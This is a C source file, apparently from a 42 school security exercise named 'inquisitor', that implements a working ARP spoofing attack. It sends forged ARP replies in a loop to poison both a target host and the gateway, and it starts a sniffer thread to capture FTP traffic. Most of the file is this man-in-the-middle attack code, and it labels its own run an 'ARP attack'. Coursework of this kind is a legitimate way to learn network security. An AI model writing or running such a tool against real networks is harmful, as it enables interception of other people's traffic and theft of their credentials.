/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   arp.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/11/22 11:57:46 by irifarac          #+#    #+#             */
/*   Updated: 2024/11/25 21:28:15 by israel           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "inquisitor.h"
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <sys/types.h>
#include <netinet/in.h>

int						sock = -1;
bool					verbose = false;
volatile sig_atomic_t	stop = 0;
pcap_t					*handle = NULL;

static char	*get_default_interface(void)
{
	char		errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t	*interfaces;
	char		*dev;

	if (pcap_findalldevs(&interfaces, errbuf) < 0)
	{
		fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
		return (NULL);
	}
	if (interfaces == NULL)
	{
		fprintf(stderr, "No interfaces found\n");
		return (NULL);
	}
	printf("default interface is %s\n", interfaces->name);
	dev = strdup(interfaces->name);
	pcap_freealldevs(interfaces);
	return (dev);
}

static void set_arp_spoof(t_info info)
{
	char				buffer[42];
	struct ether_header	*eth;
	struct ether_arp	*arp;
	struct sockaddr_ll	device;
	u_char				source_mac[MAC_ADDR_LEN];

	eth = (struct ether_header *)buffer;
	arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0)
	{
		perror("socket");
		return ;
	}
	if (sscanf(info.mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&source_mac[0], &source_mac[1], &source_mac[2],
		&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
	{
		fprintf(stderr, "Invalid MAC address\n");
		return ;
	}
	memset(&device, 0, sizeof(device));
	device.sll_family = AF_PACKET;
	device.sll_ifindex = if_nametoindex(info.dev);
	if (device.sll_ifindex == 0)
	{
		perror("if_nametoindex");
		return ;
	}
	device.sll_halen = ETH_ALEN;
	while(!stop)
	{
		set_hdrs(eth, arp, source_mac, info.ip_target);
		printf("sending arp reply to %s\n", info.ip_target);
		if (stop)
			break ;
		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
		{
			if (stop)
				break ;
			perror("ERROR: sendto()");
			break ;
		}
		spoof_gateway(eth, arp, source_mac, info.ip_target);
		printf("Gateway is spoofed\n");
		if (stop)
			break ;
		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
		{
			if (stop)
				break ;
			perror("sendto()");
			break ;
		}
		sleep(2);
	}
	printf("Exiting ARP spoofing\n");
	close(sock);
	sock = -1;
}

int	main(int argc, char **argv)
{
	t_info		info;
	int			opt;
	pthread_t	sniffer_thread;

	check_errors(argc);
	info.dev = NULL;
	while ((opt = getopt(argc, argv, "hi:v")) != -1)
	{
		switch (opt)
		{
			case 'h':
				usage();
				return (0);
			case 'i':
				info.dev = optarg;
				break ;
			case 'v':
				verbose = true;
				break ;
			default:
				usage();
				return (1);
		}
	}
	if (argc - optind < 4)
	{
		usage();
		return (1);
	}
	info.ip_src = argv[optind];
	info.mac_src = argv[optind + 1];
	info.ip_target = argv[optind + 2];
	info.mac_target = argv[optind + 3];
	signal(SIGINT, sigint_handler);
	signal(SIGTERM, sigint_handler);
	if (info.dev == NULL)
	{
			info.dev = get_default_interface();
		if (info.dev == NULL)
			return (1);
	}
	if (pthread_create(&sniffer_thread, NULL, sniff_ftp, (void *)&info) != 0)
	{
		perror("Failed to create sniffer thread");
		exit(1);
	}
	printf("dev is %s\n", info.dev);
	set_arp_spoof(info);
	pthread_join(sniffer_thread, NULL);
	free(info.dev);
	printf("Finished ARP attack");
	return (0);
}
